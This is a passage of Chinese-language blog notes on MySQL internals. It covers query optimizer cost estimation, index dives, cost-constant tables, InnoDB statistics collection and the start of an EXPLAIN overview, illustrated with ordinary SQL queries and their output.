⽽每⼀条⽬录项记录都对应⼀个数据⻚，所以计算⻚b和 ⻚c之间有多少⻚⾯就相当于计算它们⽗节点（也就是⻚ a）中对应的⽬录项记录之间隔着⼏条记录。</strong></p><p><strong>读取这95条⼆级索引记录需要付 出的CPU成本就是： *95 x 0.2 + 0.01 = 19.01*</strong></p><p><strong>他 们认为每次回表操作都相当于访问⼀个⻚⾯，也就是说⼆ 级索引范围区间有多少记录，就需要进⾏多少次回表操 作，也就是需要进⾏多少次⻚⾯I/O。我们上边统计了使 ⽤idx_key2⼆级索引执⾏查询时，预计有95条⼆级索引 记录需要进⾏回表操作，所以回表操作带来的I/O成本就 是： *95 x 1.0 = 95.0*</strong></p><p>回表操作后得到的完整⽤户记录，然后再检测其他搜索条 件是否成⽴</p><p>再检测除key2 &gt; 10 AND key2 &lt; 1000这个搜索条件以外的搜索条件是否成 ⽴。因为我们通过范围区间获取到⼆级索引记录共95 条，也就对应着聚簇索引中95条完整的⽤户记录，读取 并检测这些完整的⽤户记录是否符合其余的搜索条件的 CPU成本如下</p><p><em>**95 x 0.2 = 19.0</em> **</p><p>其中<code>95</code>是待检测记录的条数，<code>0.2</code>是检测⼀条记录是否符 合给定的搜索条件的成本常数。</p><p><strong>是否有可能使⽤索引合并（Index Merge） 本例中有关key1和key2的搜索条件是使⽤AND连接起来的，⽽对于 idx_key1和idx_key2都是范围查询，也就是说查找到的⼆级索引 记录并不是按照主键值进⾏排序的，并不满⾜使⽤Intersection 索引合并的条件，所以并不会使⽤索引合并。</strong></p><p><strong>⼀个单点区间对应的⼆级索引 记录的条数有多少，需要我们去计算。计算⽅式我们上边已经介绍过 了，就是先获取索引对应的B+树的区间最左记录和区间最右记录， 然后再计算这两条记录之间有多少记录（记录条数少的时候可以做到 精确计算，多的时候只能估算）。设计MySQL的⼤叔把这种通过直接 访问索引对应的B+树来计算某个范围区间对应的索引记录条数的⽅ 式称之为index dive。</strong></p><p>index dive就是直接利⽤索引对应的B+树来计算某个范围区间对应的记录 条数。</p><p><strong>系统变量 eq_range_index_dive_limit</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#39;%dive%&#39;;</span><br><span class="line">+---------------------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------------------+-------+</span><br><span class="line">| eq_range_index_dive_limit | 200 |</span><br><span class="line">+---------------------------+-------+</span><br><span class="line">1 row in set (0.08 sec)</span><br></pre></td></tr></table></figure><p>也就是说如果我们的IN语句中的参数个数⼩于200个的话，将使 ⽤index dive的⽅式计算各个单点区间对应的记录条数，如果⼤于 或等于200个的话，可就不能使⽤index dive了，要使⽤所谓的索 引统计数据来进⾏估算。怎么个估算法？继续往下看。</p><p>查看某个表中索引的统计数据可以使⽤SHOW INDEX FROM 表名的语法，⽐如我们查看⼀下single_table的各 个索引的统计数据可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW INDEX FROM single_table;</span><br><span class="line">+--------------+------------+--------------+--------------+-------------+-----------+-------------</span><br><span class="line">+----------+--------+------+------------+---------+---------------+</span><br><span class="line">| Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment |</span><br><span class="line">+--------------+------------+--------------+--------------+-------------+-----------+-------------</span><br><span class="line">+----------+--------+------+------------+---------+---------------+</span><br><span class="line">| single_table | 0 | PRIMARY | 1 | id | A | 9693 | NULL | NULL | | BTREE | | | </span><br><span class="line">| single_table | 0 | idx_key2 | 1 | key2 | A | 9693 | NULL | NULL | YES | BTREE | | |</span><br><span class="line">| single_table | 1 | idx_key1| 1 |key1| A | 968  | NULL | NULL |YES| BTREE | | | </span><br><span class="line">|single_table| 1 | idx_key3 | 1 | key3 | A | 799 | NULL | NULL | YES | BTREE | | |</span><br><span class="line">| single_table | 1 | idx_key_part | 1 | key_part1 | A | 9673 | NULL | NULL | YES | BTREE | | |</span><br><span class="line">| single_table | 1 | idx_key_part | 2 | key_part2 | A | 9999 | NULL | NULL | YES | BTREE | | |</span><br><span class="line">| single_table | 1 | idx_key_part | 3 | key_part3 | A | 10000 | NULL | NULL | YES | BTREE | | |</span><br><span class="line">+--------------+------------+--------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+</span><br><span class="line">7 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201161021.png" alt="image-20211201161020009"></p><p><strong>Cardinality直译过来就 是基数的意思，表示索引列中不重复值的个数。⽐如对于⼀个⼀万⾏ 记录的表来说，某个索引列的Cardinality属性是10000，那意味 着该列中没有重复的值，如果Cardinality属性是1的话，就意味 着该列的值全部是重复的。不过需要注意的是，对于InnoDB存储引 擎来说，使⽤SHOW INDEX语句展示出来的某个索引列的 Cardinality属性是⼀个估计值，并不是精确的。</strong></p><p>当IN语句中的参数个数⼤于或等于系统变量 eq_range_index_dive_limit的值的话，就不会使⽤index dive的⽅式计算各个单点区间对应的索引记录条数，⽽是使⽤索引 统计数据，这⾥所指的索引统计数据指的是这两个值：</p><p>使⽤SHOW TABLE STATUS展示出的Rows值，也就是⼀个表 中有多少条记录。 这个统计数据我们在前边唠叨全表扫描成本的时候说过很多遍 了，就不赘述了。</p><p>使⽤SHOW INDEX语句展示出的Cardinality属性。 结合上⼀个Rows统计数据，我们可以针对索引列，计算出平均 ⼀个值重复多少次。</p><p><strong>⼀个值的重复次数 ≈ Rows ÷ Cardinality</strong> <strong>它的致命弱点就是：不精确！</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211201161158.png" alt="image-20211201161156659"></p><p><strong>连接查询的成本</strong></p><p>Condition filtering介绍</p><p>把对驱动表进⾏查询后得到的记录条数称之为驱动表的扇出（英 ⽂名：fanout）</p><p>对被驱动表的查询次数也就越少，连接查询的总成本也就越低。当查询优化器想计算整个连接查询所使⽤的成本时，就需要计算出驱动表的扇出值。</p><blockquote><p>如果使⽤的是全表扫描的⽅式执⾏的单表查询，那么计算驱动 表扇出时需要猜满⾜搜索条件的记录到底有多少条。</p></blockquote><blockquote><p>如果使⽤的是索引执⾏的单表扫描，那么计算驱动表扇出的时 候需要猜满⾜除使⽤到对应索引的搜索条件外的其他搜索条件 的记录有多少条。</p></blockquote><p><strong>这里的 condition filtering 作者解释得不是很严谨</strong></p><p>在MySQL 5.7之前的版本中，查询优化器在计算驱动表扇出时，如 果是使⽤全表扫描的话，就直接使⽤表中记录的数量作为扇出值， 如果使⽤索引的话，就直接使⽤满⾜范围条件的索引记录条数作为 扇出值。在MySQL 5.7中，设计MySQL的⼤叔引⼊了这个 condition filtering的功能，就是还要猜⼀猜剩余的那些搜索 条件能把驱动表中的记录再过滤多少条，其实本质上就是为了让成 本估算更精确。 我们所说的纯粹瞎猜其实是很不严谨的，设计MySQL的⼤叔们称之 为启发式规则（heuristic），⼤家有兴趣的可以再深⼊了解⼀下 哈。</p><p><strong>两表连接的成本分析</strong></p><p><strong>多表连接的成本分析</strong></p><p>这两块内容还蛮复杂的</p><p>连接查询总成本 = 单次访问驱动表的成本 + 驱动表扇出数 x 单 次访问被驱动表的成本</p><p><strong>调节成本常数</strong></p><p>⼀条语句的执⾏其实是分为两层的：</p><p>server层 存储引擎层</p><p><strong>mysql.server_cost表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM mysql.server_cost;</span><br><span class="line">+------------------------------+------------+---------------------+---------+</span><br><span class="line">| cost_name | cost_value | last_update | comment |</span><br><span class="line">+------------------------------+------------+---------------------+---------+</span><br><span class="line">| disk_temptable_create_cost | NULL | 2018-01-20 12:03:21 | NULL |</span><br><span class="line">| disk_temptable_row_cost | NULL | 2018-01-20 12:03:21 | NULL |</span><br><span class="line">| key_compare_cost | NULL | 2018-01-20 12:03:21 | NULL |</span><br><span class="line">| memory_temptable_create_cost | NULL | 2018-01-20 12:03:21 | NULL |</span><br><span class="line">| memory_temptable_row_cost | NULL | 2018-01-20 12:03:21 | NULL |</span><br><span class="line">| row_evaluate_cost | NULL | 2018-01-20 12:03:21 | NULL |</span><br><span class="line">+------------------------------+------------+---------------------+---------+</span><br><span class="line">6 rows in set (0.05 sec)</span><br></pre></td></tr></table></figure><p>MySQL在执⾏诸如DISTINCT查询、分组查询、Union查询以及某些 特殊条件下的排序查询都可能在内部先创建⼀个临时表，使⽤这个 临时表来辅助完成查询（⽐如对于DISTINCT查询可以建⼀个带 有UNIQUE索引的临时表，直接把需要去重的记录插⼊到这个临时表 中，插⼊完成之后的记录就是结果集了）。在数据量⼤的情况下可 能创建基于磁盘的临时表，也就是为该临时表使⽤MyISAM、 InnoDB等存储引擎，在数据量不⼤时可能创建基于内存的临时表， 也就是使⽤Memory存储引擎。创建临时表 和对这个临时表进⾏写⼊和读取的操作代价还是很⾼的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATE mysql.server_cost</span><br><span class="line">SET cost_value &#x3D; 0.4</span><br><span class="line">WHERE cost_name &#x3D; &#39;row_evaluate_cost&#39;;</span><br><span class="line"></span><br><span class="line">FLUSH OPTIMIZER_COSTS;</span><br></pre></td></tr></table></figure><p><strong>mysql.engine_cost表</strong></p><p>engine_cost表表中在存储引擎层进⾏的⼀些操作对应的成本常 数，具体内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM mysql.engine_cost;</span><br><span class="line">+-------------+-------------+------------------------+------------+---------------------+---------+</span><br><span class="line">| engine_name | device_type | cost_name| cost_value | last_update | comment |</span><br><span class="line">+-------------+-------------+------------------------+------------+---------------------+---------+</span><br><span class="line">| default | 0 | io_block_read_cost| NULL | 2018-01-20 12:03:21 | NULL |</span><br><span class="line">| default | 0 | memory_block_read_cost | NULL | 2018-01-2012:03:21 | NULL |</span><br><span class="line">+-------------+-------------+------------------------+------------+--------------------+---------+</span><br><span class="line">2 rows in set (0.05 sec)</span><br></pre></td></tr></table></figure><h1 id="兵马未动，粮草先行-——-InnoDB-统计数据是如何收集的"><a href="#兵马未动，粮草先行-——-InnoDB-统计数据是如何收集的" class="headerlink" title="兵马未动，粮草先行 —— InnoDB 统计数据是如何收集的"></a>兵马未动，粮草先行 —— InnoDB 统计数据是如何收集的</h1><p><strong>两种不同的统计数据存储⽅式</strong></p><p>InnoDB提供了两种存储统计数据的⽅式：</p><p>永久性的统计数据 这种统计数据存储在磁盘上，也就是服务器重启之后这些统计 数据还在。</p><p>⾮永久性的统计数据 这种统计数据存储在内存中，当服务器关闭时这些这些统计数 据就都被清除掉了，等到服务器重启之后，在某些适当的场景 下才会重新收集这些统计数据。</p><p>系统变量 innodb_stats_persistent来控制到底采⽤哪种⽅式去存储统计 数据。在MySQL 5.6.6之前，innodb_stats_persistent的值 默认是OFF，也就是说InnoDB的统计数据默认是存储到内存的，之 后的版本中innodb_stats_persistent的值默认是ON，也就是统 计数据默认被存储到磁盘中。</p><p><strong>指定STATS_PERSISTENT属性来指明 该表的统计数据存储⽅式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名 (...) Engine&#x3D;InnoDB,</span><br><span class="line">STATS_PERSISTENT &#x3D; (1|0);</span><br><span class="line"></span><br><span class="line">ALTER TABLE 表名 Engine&#x3D;InnoDB, STATS_PERSISTENT &#x3D;</span><br><span class="line">(1|0);</span><br></pre></td></tr></table></figure><p>当STATS_PERSISTENT=1时，表明我们想把该表的统计数据永久的 存储到磁盘上，当STATS_PERSISTENT=0时，表明我们想把该表的 统计数据临时的存储到内存中。如果我们在创建表时未指定 STATS_PERSISTENT属性，那默认采⽤系统变量 innodb_stats_persistent的值作为该属性的值。</p><p><strong>基于磁盘的永久性统计数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW TABLES FROM mysql LIKE &#39;innodb%&#39;;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Tables_in_mysql (innodb%) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| innodb_index_stats |</span><br><span class="line">| innodb_table_stats |</span><br><span class="line">+---------------------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>这个innodb_table_stats表中的各个列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字段名 描述</span><br><span class="line">database_name 数据库名</span><br><span class="line">table_name 表名</span><br><span class="line">last_update 本条记录最后更新时间</span><br><span class="line">n_rows 表中记录的条数</span><br><span class="line">clustered_index_size 表的聚簇索引占⽤的⻚⾯数量</span><br><span class="line">sum_of_other_index_sizes表的其他索引占⽤的⻚⾯数量</span><br></pre></td></tr></table></figure><p>主键是(database_name,table_name) 每条记录代表着⼀个表的统计信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM mysql.innodb_table_stats;</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">|database_name|table_name|last_update|n_rows|clustered_index_size| sum_of_other_index_sizes |</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+-----------</span><br><span class="line">---------------+</span><br><span class="line">| mysql | gtid_executed | 2018-07-10 23:51:36 | 0 | 1 | 0 | </span><br><span class="line">| sys | sys_config | 2018-07-10 23:51:38 | 5 | 1 | 0 |</span><br><span class="line">| xiaohaizi | single_table | 2018-12-10 17:03:13 | 9693 | 97 | 175 |</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+-----------</span><br><span class="line">---------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>single_table表的统计信息就对应着mysql.innodb_table_stats的第三条记录。</p><p>⼏个重要统计信 息项的值如下：</p><p>n_rows的值是9693，表明single_table表中⼤约有9693 条记录，注意这个数据是估计值。</p><p>clustered_index_size的值是97，表明single_table表 的聚簇索引占⽤97个⻚⾯，这个值是也是⼀个估计值。</p><p>sum_of_other_index_sizes的值是175，表 明single_table表的其他索引⼀共占⽤175个⻚⾯，这个值 是也是⼀个估计值。</p><p><strong>按照⼀定算法（并不是纯粹随机的）选取⼏个叶⼦节点⻚⾯， 计算每个⻚⾯中主键值记录数量，然后计算平均⼀个⻚⾯中主 键值的记录数量乘以全部叶⼦节点的数量就算是该表的 n_rows值。</strong></p><p><strong>innodb_stats_persistent_sample_pages的系统变 量来控制使⽤永久性的统计数据时，计算统计数据时采样的⻚ ⾯数量。</strong></p><p>该值设置的越⼤，统计出的n_rows值越精确，但是 统计耗时也就最久；该值设置的越⼩，统计出的n_rows值越 不精确，但是统计耗时特别少。所以在实际使⽤是需要我们去 权衡利弊，该系统变量的默认值是20</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名 (...) Engine&#x3D;InnoDB,</span><br><span class="line">STATS_SAMPLE_PAGES &#x3D; 具体的采样⻚⾯数量;</span><br><span class="line">ALTER TABLE 表名 Engine&#x3D;InnoDB,</span><br><span class="line">STATS_SAMPLE_PAGES &#x3D; 具体的采样⻚⾯数量;</span><br></pre></td></tr></table></figure><p>如果我们在创建表的语句中并没有指定 STATS_SAMPLE_PAGES属性的话，将默认使⽤系统变量 innodb_stats_persistent_sample_pages的值作为该 属性的值。</p><p><strong>clustered_index_size和sum_of_other_index_sizes统计项的 收集</strong></p><p>这两个统计项的收集过程如下：</p><p>从数据字典⾥找到表的各个索引对应的根⻚⾯位置。</p><p>系统表SYS_INDEXES⾥存储了各个索引对应的根⻚⾯信息。</p><p>从根⻚⾯的Page Header⾥找到叶⼦节点段和⾮叶⼦节点段对应的Segment Header。在每个索引的根⻚⾯的Page Header部分都有两个字段： PAGE_BTR_SEG_LEAF：表示B+树叶⼦段的Segment Header信息。 PAGE_BTR_SEG_TOP：表示B+树⾮叶⼦段的Segment Header信息。</p><p>从叶⼦节点段和⾮叶⼦节点段的Segment Header中找到这两个段对应的INODE Entry结构。 这个是Segment Header结构：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211202094928.png" alt="image-20211202094920213"></p><p>从对应的INODE Entry结构中可以找到该段对应所有零散的 ⻚⾯地址以及FREE、NOT_FULL、FULL链表的基节点。</p><p>这个是INODE Entry结构：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211202095003.png" alt="image-20211202095000922"></p><p>直接统计零散的⻚⾯有多少个，然后从那三个链表的List Length字段中读出该段占⽤的区的⼤⼩，每个区占⽤64个 ⻚，所以就可以统计出整个段占⽤的⻚⾯。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211202095058.png" alt="image-20211202095056673"></p><p>分别计算聚簇索引的叶⼦结点段和⾮叶⼦节点段占⽤的⻚⾯ 数，它们的和就是clustered_index_size的值，按照同样 的套路把其余索引占⽤的⻚⾯数都算出来，加起来之后就 是sum_of_other_index_sizes的值。</p><p>这⾥需要⼤家注意⼀个问题，我们说⼀个段的数据在⾮常多时（超过 32个⻚⾯），会以区为单位来申请空间，这⾥头的问题是以区为单 位申请空间中有⼀些⻚可能并没有使⽤，但是在统计 clustered_index_size和sum_of_other_index_sizes时都 把它们算进去了，所以说聚簇索引和其他的索引占⽤的⻚⾯数可能⽐ 这两个值要⼩⼀些。</p><p><strong>innodb_index_stats</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">字段名 描述</span><br><span class="line">database_name 数据库名</span><br><span class="line">table_name 表名</span><br><span class="line">index_name 索引名</span><br><span class="line">last_update 本条记录最后更新时间</span><br><span class="line">stat_name 统计项的名称</span><br><span class="line">stat_value 对应的统计项的值</span><br><span class="line">sample_size 为⽣成统计数据⽽采样的⻚⾯数量</span><br><span class="line">stat_description对应的统计项的描述</span><br></pre></td></tr></table></figure><p>主键 是(database_name,table_name,index_name,stat_name)，innodb_index_stats表的每条记录代表着⼀个索引的⼀个统计项</p><p>index_name列，这个列说明该记录是哪个索引的统计 信息，从结果中我们可以看出来，PRIMARY索引（也就是主 键）占了3条记录，idx_key_part索引占了6条记录。</p><p>具体看⼀下⼀个索引都有哪些统计项：</p><ul><li><p>n_leaf_pages：表示该索引的叶⼦节点占⽤多少⻚⾯。</p></li><li><p>size：表示该索引共占⽤多少⻚⾯。</p></li><li><p>n_diff_pfxNN：表示对应的索引列不重复的值有多少。</p><p>其中的NN⻓得有点⼉怪呀，啥意思呢？ 其实NN可以被替换为01、02、03… 这样的数字。⽐如对 于idx_key_part来说：</p><ul><li>n_diff_pfx01表示的是统计key_part1这单单 ⼀个列不重复的值有多少</li><li>n_diff_pfx02表示的是统计key_part1、 key_part2这两个列组合起来不重复的值有多少。</li><li>n_diff_pfx03表示的是统计key_part1、 key_part2、key_part3这三个列组合起来不重 复的值有多少。</li><li>n_diff_pfx04表示的是统计key_part1、 key_part2、key_part3、id这四个列组合起来 不重复的值有多少。</li></ul></li></ul><p>对于普通的⼆级索引，并不能保证 它的索引列值是唯⼀的，⽐如对于idx_key1来说， key1列就可能有很多值重复的记录。此时只有在索引列 上加上主键值才可以区分两条索引列值都⼀样的⼆级索 引记录。</p><p>在计算某些索引列中包含多少不重复值时，需要对⼀些叶⼦节点⻚⾯进⾏采样，size列就表明了采样的⻚⾯数量是多少。</p><p><strong>对于有多个列的联合索引来说，采样的⻚⾯数量是： innodb_stats_persistent_sample_pages × 索引列的 个数。当需要采样的⻚⾯数量⼤于该索引的叶⼦节点数量的 话，就直接采⽤全表扫描来统计索引列的不重复值数量了。所 以⼤家可以在查询结果中看到不同索引对应的size列的值可能 是不同的。</strong></p><p><strong>定期更新统计数据</strong></p><p>随着我们不断的对表进⾏增删改操作，表中的数据也⼀直在变 化，innodb_table_stats和innodb_index_stats表⾥的统计数据是不是也应该跟着变⼀变了？</p><p><strong>开启innodb_stats_auto_recalc</strong></p><p>不过 ⾃动重新计算统计数据的过程是异步发⽣的，也就是即使表中 变动的记录数超过了10%，⾃动重新计算统计数据也不会⽴即 发⽣，可能会延迟⼏秒才会进⾏计算。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名 (...) Engine&#x3D;InnoDB,</span><br><span class="line">STATS_AUTO_RECALC &#x3D; (1|0);</span><br><span class="line">ALTER TABLE 表名 Engine&#x3D;InnoDB,</span><br><span class="line">STATS_AUTO_RECALC &#x3D; (1|0);</span><br></pre></td></tr></table></figure><p>如果我们在创建表时未指定 STATS_AUTO_RECALC属性，那默认采⽤系统变量 innodb_stats_auto_recalc的值作为该属性的值。</p><p><strong>⼿动调⽤ANALYZE TABLE语句来更新统计信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ANALYZE TABLE single_table;</span><br><span class="line">+------------------------+---------+----------+----------+</span><br><span class="line">| Table | Op | Msg_type | Msg_text |</span><br><span class="line">+------------------------+---------+----------+----------+</span><br><span class="line">| xiaohaizi.single_table | analyze | status | OK |</span><br><span class="line">+------------------------+---------+----------+----------+</span><br><span class="line">1 row in set (0.08 sec)</span><br></pre></td></tr></table></figure><p>ANALYZE TABLE语句会⽴即重新计算统计数 据，也就是这个过程是同步的，在表中索引多或者采样⻚⾯特 别多时这个过程可能会特别慢，请不要没事⼉就运⾏⼀ 下ANALYZE TABLE语句，最好在业务不是很繁忙的时候再运 ⾏。</p><p><strong>⼿动更新innodb_table_stats和 innodb_index_stats表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATE innodb_table_stats</span><br><span class="line">SET n_rows &#x3D; 1</span><br><span class="line">WHERE table_name &#x3D; &#39;single_table&#39;;</span><br><span class="line"></span><br><span class="line">FLUSH TABLE single_table;</span><br></pre></td></tr></table></figure><p><strong>基于内存的⾮永久性统计数据</strong></p><p>与永久性的统计数据不同，⾮永久性的统计数据采样的⻚⾯数量是 由innodb_stats_transient_sample_pages控制的，这个系统 变量的默认值是8。</p><p>由于⾮永久性的统计数据经常更新，所以导致MySQL查询优化 器计算查询成本的时候依赖的是经常变化的统计数据，也就会⽣成经 常变化的执⾏计划。</p><p><strong>innodb_stats_method的使⽤</strong></p><p>我们知道索引列不重复的值的数量这个统计数据对于MySQL查询优化 器⼗分重要，因为通过它可以计算出在索引列中平均⼀个值重复多少 ⾏，<strong>它的应⽤场景主要有两个：</strong></p><p><strong>单表查询中单点区间太多</strong>，⽐⽅说这样： SELECT * FROM tbl_name WHERE key IN (‘xx1’ , ‘xx2’ , …, ‘xxn’); 当IN⾥的参数数量过多时，采⽤index dive的⽅式直接访问 B+树索引去统计每个单点区间对应的记录的数量就太耗费性能 了，所以直接依赖统计数据中的平均⼀个值重复多少⾏来计算 单点区间对应的记录数量。</p><p><strong>连接查询时，如果有涉及两个表的等值匹配连接条件，该连接 条件对应的被驱动表中的列⼜拥有索引时，则可以使⽤ref访 问⽅法来对被驱动表进⾏查询，⽐⽅说这样</strong></p><p>SELECT * FROM t1 JOIN t2 ON t1.column = t2.key WHERE …；</p><p><strong>在真正执⾏对t2表的查询前，t1.comumn的值是不确定的， 所以我们也不能通过index dive的⽅式直接访问B+树索引去 统计每个单点区间对应的记录的数量，所以也只能依赖统计数 据中的平均⼀个值重复多少⾏来计算单点区间对应的记录数 量。</strong></p><p>在统计索引列不重复的值的数量时，有⼀个⽐较烦的问题就是索引列 中出现NULL值怎么办</p><p>每⼀个<code>NULL</code>值都是独⼀⽆⼆的，也就是说统计索引列不重复 的值的数量时，应该把<code>NULL</code>值当作⼀个独⽴的值，所以<code>col</code>列 的不重复的值的数量就是：<code>4</code>（分别是1、2、NULL、NULL这四个 值）。</p><p><strong>innodb_stats_method系统变量</strong></p><p>相当于在计算某个索引列 不重复值的数量时如何对待NULL值这个锅甩给了⽤户，这个系统变 量有三个候选值：</p><ul><li>nulls_equal：认为所有NULL值都是相等的。这个值也是innodb_stats_method的默认值。 如果某个索引列中NULL值特别多的话，这种统计⽅式会让优化 器认为某个列中平均⼀个值重复次数特别多，所以倾向于不使 ⽤索引进⾏访问。</li><li>nulls_unequal：认为所有NULL值都是不想等的。 如果某个索引列中NULL值特别多的话，这种统计⽅式会让优化 器认为某个列中平均⼀个值重复次数特别少，所以倾向于使⽤ 索引进⾏访问。</li><li>nulls_ignored：直接把NULL值忽略掉。</li></ul><p>最好不在索引列中 存放NULL值才是正解。</p><p><strong>总结</strong></p><p>InnoDB以表为单位来收集统计数据，这些统计数据可以是基 于磁盘的永久性统计数据，也可以是基于内存的⾮永久性统计 数据。</p><p>innodb_stats_persistent控制着使⽤永久性统计数据还 是⾮永久性统计数 据；innodb_stats_persistent_sample_pages控制着 永久性统计数据的采样⻚⾯数 量；innodb_stats_transient_sample_pages控制着⾮ 永久性统计数据的采样⻚⾯数 量；innodb_stats_auto_recalc控制着是否⾃动重新计算 统计数据。</p><p>我们可以针对某个具体的表，在创建和修改表时通过指定 STATS_PERSISTENT、STATS_AUTO_RECALC、STATS_SAMPLE_PAGES 的值来控制相关统计数据属性。</p><p>innodb_stats_method决定着在统计某个索引列不重复值的 数量时如何对待NULL值</p><h1 id="不好看就要多整容-——-MySQL-基于规则的优化（内含关于子查询优化二三事儿）"><a href="#不好看就要多整容-——-MySQL-基于规则的优化（内含关于子查询优化二三事儿）" class="headerlink" title="不好看就要多整容 —— MySQL 基于规则的优化（内含关于子查询优化二三事儿）"></a>不好看就要多整容 —— MySQL 基于规则的优化（内含关于子查询优化二三事儿）</h1><p>这一部分的内容很简单</p><h1 id="查询优化的百科全书-——-Explain-详解（上）（下）"><a href="#查询优化的百科全书-——-Explain-详解（上）（下）" class="headerlink" title="查询优化的百科全书 —— Explain 详解（上）（下）"></a>查询优化的百科全书 —— Explain 详解（上）（下）</h1><p>都在解释各个字段的意思。</p><p>⼀条查询语句在经过MySQL查询优化器的各种基于成本和规则的优化 会后⽣成⼀个所谓的执⾏计划，这个执⾏计划展示了接下来具体执⾏ 查询的⽅式，⽐如多表连接的顺序是什么，对于每个表采⽤什么访问 ⽅法来具体执⾏查询等等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">列名 描述</span><br><span class="line">id 在⼀个⼤的查询语句中每个SELECT关键字都对应⼀个唯⼀的id</span><br><span class="line">select_type SELECT关键字对应的那个查询的类型</span><br><span class="line">table 表名</span><br><span class="line">partitions 匹配的分区信息</span><br><span class="line">type 针对单表的访问⽅法</span><br><span class="line">possible_keys可能⽤到的索引</span><br><span class="line">key 实际上使⽤的索引</span><br><span class="line">key_len 实际使⽤到的索引⻓度</span><br><span class="line">ref 当使⽤索引列等值查询时，与索引列进⾏等值匹配的对象信息</span><br><span class="line">rows 